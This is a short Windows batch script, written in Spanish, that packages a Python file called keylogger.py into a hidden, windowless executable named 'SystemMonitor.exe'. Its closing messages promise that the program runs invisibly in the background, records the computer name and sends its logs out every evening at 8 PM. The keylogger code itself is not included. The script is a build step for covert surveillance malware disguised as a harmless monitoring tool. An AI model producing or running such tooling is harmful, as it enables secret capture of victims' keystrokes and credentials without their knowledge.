@echo off
echo ============================================
echo   Generando Monitor de Sistema Invisible
echo ============================================
echo.

echo [1/3] Verificando Python...
python --version
if errorlevel 1 (
    echo ERROR: Python no esta instalado
    pause
    exit /b 1
)

echo.
echo [2/3] Creando ejecutable invisible...
python -m PyInstaller --onefile --noconsole --name="SystemMonitor" keylogger.py

if errorlevel 1 (
    echo.
    echo ERROR: Hubo un problema al crear el ejecutable
    pause
    exit /b 1
)

echo.
echo [3/3] Limpiando archivos temporales...
if exist build rmdir /s /q build
if exist SystemMonitor.spec del /q SystemMonitor.spec

echo.
echo ============================================
echo   COMPLETADO - Ejecutable INVISIBLE creado
echo ============================================
echo.
echo Archivo: dist\SystemMonitor.exe
echo.
echo IMPORTANTE:
echo - Se ejecuta completamente en segundo plano (sin ventana)
echo - Nombre del equipo se obtiene automaticamente
echo - Envia registros a las 8 PM todos los dias
echo.
pause